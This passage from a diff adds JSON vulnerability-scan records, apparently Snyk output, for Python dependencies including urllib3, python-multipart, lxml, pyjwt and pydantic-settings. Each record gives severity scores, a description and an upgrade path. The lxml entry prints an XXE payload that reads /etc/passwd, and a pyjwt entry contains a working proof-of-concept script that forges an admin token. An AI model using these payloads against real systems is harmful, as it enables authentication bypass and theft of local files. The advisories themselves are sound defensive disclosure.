+      "description": "## Overview\n[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.\n\nAffected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data in `urlopen()` when using `ProxyManager.connection_from_url()` with `assert_same_host=False`, directly rather than via the high-level APIs including `urllib3.request()`, `PoolManager.request()`, and `ProxyManager.request()`. An attacker can expose headers such as `Authorization`, `Cookie`, and `Proxy-Authorization` by triggering cross-origin redirects, which does not properly invoke `remove_headers_on_redirect`.\n## Remediation\nUpgrade `urllib3` to version 2.7.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc)\n- [GitHub Commit](https://github.com/urllib3/urllib3/commit/5ec0de499b9166ca71c65ab04f2a7e4eb0d66fcc)\n",
+      "disclosureTime": "2026-05-11T14:51:20.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.40595",
+        "probability": "0.00527"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "2.7.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "urllib3@2.6.3"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-URLLIB3-16642024",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-44431"
+        ],
+        "CWE": [
+          "CWE-201"
+        ],
+        "GHSA": [
+          "GHSA-qccp-gfcp-xxvc"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-27T14:03:22.000000Z",
+      "name": "urllib3",
+      "packageManager": "pip",
+      "packageName": "urllib3",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-12T08:50:42.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/urllib3/urllib3/commit/5ec0de499b9166ca71c65ab04f2a7e4eb0d66fcc"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[1.23,2.7.0)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Insertion of Sensitive Information Into Sent Data",
+      "upgradePath": [
+        false,
+        "urllib3@2.7.0"
+      ],
+      "version": "2.6.3"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T14:08:21.000000Z",
+      "credit": [
+        "maxisbey"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.7,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.7,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "## Overview\n[python-multipart](https://pypi.org/project/python-multipart) is an A streaming multipart parser for Python\n\nAffected versions of this package are vulnerable to Inefficient Algorithmic Complexity in the `QuerystringParser` function when parsing `application/x-www-form-urlencoded` bodies containing semicolon-separated fields. An attacker can cause excessive CPU consumption by submitting specially crafted request bodies with repeated semicolon separators, leading to significant processing delays and potential exhaustion of worker processes.\n## Remediation\nUpgrade `python-multipart` to version 0.0.30 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/python-multipart/security/advisories/GHSA-5rvq-cxj2-64vf)\n- [GitHub Commit](https://github.com/Kludex/python-multipart/commit/d69df35cd2cad9c72794c2c340db646afae957d8)\n",
+      "disclosureTime": "2026-06-15T20:24:09.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.17423",
+        "probability": "0.00263"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "0.0.30"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "python-multipart@0.0.26"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYTHONMULTIPART-17345663",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-53539"
+        ],
+        "CWE": [
+          "CWE-407"
+        ],
+        "GHSA": [
+          "GHSA-5rvq-cxj2-64vf"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:05:13.000000Z",
+      "name": "python-multipart",
+      "packageManager": "pip",
+      "packageName": "python-multipart",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T14:08:21.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-5rvq-cxj2-64vf"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/python-multipart/commit/d69df35cd2cad9c72794c2c340db646afae957d8"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,0.0.30)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Inefficient Algorithmic Complexity",
+      "upgradePath": [
+        false,
+        "python-multipart@0.0.30"
+      ],
+      "version": "0.0.26"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-04-22T07:31:12.000000Z",
+      "credit": [
+        "Qiu Sihao"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.7,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.7,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 5.9,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5.9,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection via the `iterparse` or `ETCompatXMLParser` functions when `resolve_entities` is set to allow external entities. An attacker can access local files by providing crafted XML input containing external entity references. \n\n## Workaround \n\nThis vulnerability can be mitigated by explicitly setting the `resolve_entities` option to `resolve_entities='internal'` or `resolve_entities=False`.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `lxml` to version 6.1.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/lxml/lxml/security/advisories/GHSA-vfmq-68hx-4jfw)\n- [GitHub Commit](https://github.com/lxml/lxml/commit/ab431ea0b9a7357d968f1d1c5c614649e9aaf358)\n- [GitHub Release](https://github.com/lxml/lxml/releases/tag/lxml-6.1.0)\n- [Launchpad Bug](https://bugs.launchpad.net/lxml/+bug/2146291)\n",
+      "disclosureTime": "2026-04-21T20:38:44.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.24058",
+        "probability": "0.00324"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "6.1.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "lxml@5.3.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-LXML-16119103",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-41066"
+        ],
+        "CWE": [
+          "CWE-611"
+        ],
+        "GHSA": [
+          "GHSA-vfmq-68hx-4jfw"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-28T02:01:01.000000Z",
+      "name": "lxml",
+      "packageManager": "pip",
+      "packageName": "lxml",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-04-22T07:31:13.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/lxml/lxml/security/advisories/GHSA-vfmq-68hx-4jfw"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/lxml/lxml/commit/ab431ea0b9a7357d968f1d1c5c614649e9aaf358"
+        },
+        {
+          "title": "GitHub Release",
+          "url": "https://github.com/lxml/lxml/releases/tag/lxml-6.1.0"
+        },
+        {
+          "title": "Launchpad Bug",
+          "url": "https://bugs.launchpad.net/lxml/%2Bbug/2146291"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,6.1.0)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "XML External Entity (XXE) Injection",
+      "upgradePath": [
+        false,
+        "lxml@6.1.0"
+      ],
+      "version": "5.3.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T13:38:23.000000Z",
+      "credit": [
+        "maxisbey"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n[python-multipart](https://pypi.org/project/python-multipart) is an A streaming multipart parser for Python\n\nAffected versions of this package are vulnerable to HTTP Request Smuggling through the `QuerystringParser` function. An attacker can bypass upstream validation and inject or override form fields by crafting specially formatted `application/x-www-form-urlencoded` bodies that exploit differences in field separator parsing.\n\n**Note:**\n\nThis is only exploitable if there is an upstream body-inspecting component (a WAF, API gateway, proxy, etc.) between the attacker and the application, and that intermediary follows the WHATWG standard (treating only `&` as a separator, not `;`).\n## Remediation\nUpgrade `python-multipart` to version 0.0.30 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/python-multipart/security/advisories/GHSA-6jv3-5f52-599m)\n- [GitHub Commit](https://github.com/Kludex/python-multipart/commit/d69df35cd2cad9c72794c2c340db646afae957d8)\n",
+      "disclosureTime": "2026-06-15T20:22:25.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.07179",
+        "probability": "0.00176"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "0.0.30"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "python-multipart@0.0.26"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYTHONMULTIPART-17344732",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-53538"
+        ],
+        "CWE": [
+          "CWE-444"
+        ],
+        "GHSA": [
+          "GHSA-6jv3-5f52-599m"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:05:11.000000Z",
+      "name": "python-multipart",
+      "packageManager": "pip",
+      "packageName": "python-multipart",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T13:38:23.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-6jv3-5f52-599m"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/python-multipart/commit/d69df35cd2cad9c72794c2c340db646afae957d8"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,0.0.30)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "HTTP Request Smuggling",
+      "upgradePath": [
+        false,
+        "python-multipart@0.0.30"
+      ],
+      "version": "0.0.26"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-29T07:38:09.000000Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5.9,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Cleanup on Thrown Exception via the `get_signing_key` function. An attacker can exhaust system resources by sending numerous JWTs with attacker-controlled `kid` values, causing repeated outbound requests to the JWKS endpoint.\n\n**Note:**\n\nThis is only exploitable if the JWKS fetch fails and the upstream endpoint does not implement effective rate limiting or error handling.\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "disclosureTime": "2026-05-28T16:50:11.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.12568",
+        "probability": "0.00222"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYJWT-17054465",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48524"
+        ],
+        "CWE": [
+          "CWE-460"
+        ],
+        "GHSA": [
+          "GHSA-fhv5-28vv-h8m8"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-24T11:12:49.000000Z",
+      "name": "pyjwt",
+      "packageManager": "pip",
+      "packageName": "pyjwt",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-29T07:38:09.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Improper Cleanup on Thrown Exception",
+      "upgradePath": [
+        false,
+        "pyjwt@2.13.0"
+      ],
+      "version": "2.12.1"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-29T16:02:32.000000Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 4.8,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 4.8,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+        }
+      ],
+      "description": "## Overview\n[pydantic-settings](https://pypi.org/project/pydantic-settings) is a Settings management using Pydantic\n\nAffected versions of this package are vulnerable to Symlink Attack in the `NestedSecretsSettingsSource` process when `secrets_nested_subdir` is enabled and a symbolic link inside the configured secrets directory points outside of it. An attacker can access files outside the intended directory and bypass configured size restrictions by placing crafted symbolic links within the secrets directory. This is only exploitable if an attacker or lower-privileged component can create or modify entries in the configured secrets directory.\n \n## Workaround \n This vulnerability can be mitigated by ensuring the configured secrets directory is fully owned and controlled by the application, or by avoiding the use of `secrets_nested_subdir=True`.\n## Remediation\nUpgrade `pydantic-settings` to version 2.14.2 or higher.\n## References\n- [GitHub Advisory](https://github.com/pydantic/pydantic-settings/security/advisories/GHSA-4xgf-cpjx-pc3j)\n",
+      "disclosureTime": "2026-06-19T22:10:42.000000Z",
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "2.14.2"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "pydantic-settings@2.13.1"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYDANTICSETTINGS-17675228",
+      "identifiers": {
+        "CVE": [],
+        "CWE": [
+          "CWE-59",
+          "CWE-22"
+        ],
+        "GHSA": [
+          "GHSA-4xgf-cpjx-pc3j"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-29T16:02:35.000000Z",
+      "name": "pydantic-settings",
+      "packageManager": "pip",
+      "packageName": "pydantic-settings",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-29T16:02:32.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/pydantic/pydantic-settings/security/advisories/GHSA-4xgf-cpjx-pc3j"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.12.0,2.14.2)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Symlink Attack",
+      "upgradePath": [
+        false,
+        "pydantic-settings@2.14.2"
+      ],
+      "version": "2.13.1"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-29T07:28:00.000000Z",
+      "credit": [
+        "Arad Inbar"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.8,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.8,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.2,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 7.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Authentication when decoding JSON Web Tokens. An attacker can forge valid tokens by supplying a public key as the secret for the HMAC algorithm when both asymmetric and HMAC algorithms are supported.\n## PoC\n```python\nfrom jwt.api_jws import PyJWS\nimport json, base64, hmac, hashlib\n\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\")\n\n# Public RSA JWK (public by design)\nrsa_jwk_json = json.dumps({\"kty\":\"RSA\",\"n\":\"AQAB\",\"e\":\"AQAB\"})\n\n# Attacker-crafted token: flip to HS256 and choose claims\nheader  = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')\npayload = b64u(b'{\"sub\":\"alice\",\"admin\":true}')\nsigning = header + b\".\" + payload\n\n# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”\nsig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()\ntoken = (signing + b\".\" + b64u(sig)).decode()\n\n# Vulnerable verifier: mixed families + JWK JSON string as key\njws = PyJWS()\nprint(jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"]))\n# -> b'{\"sub\":\"alice\",\"admin\":true}'\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "disclosureTime": "2026-05-28T16:50:06.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.29739",
+        "probability": "0.00379"
+      },
+      "exploit": "Proof of Concept",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Proof of Concept",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Proof of Concept",
+            "type": "primary"
+          }
+        ],
+        "sources": [
+          "Snyk"
+        ]
+      },
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYJWT-17053408",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48526"
+        ],
+        "CWE": [
+          "CWE-287"
+        ],
+        "GHSA": [
+          "GHSA-xgmm-8j9v-c9wx"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-30T14:03:20.000000Z",
+      "name": "pyjwt",
+      "packageManager": "pip",
+      "packageName": "pyjwt",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-29T07:28:00.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Improper Authentication",
+      "upgradePath": [
+        false,
+        "pyjwt@2.13.0"
+      ],
+      "version": "2.12.1"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-29T07:42:43.000000Z",
+      "credit": [
+        "Keijo Tuominen"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 2.1,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 2.1,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 4.2,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 4.2,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        },
+        {
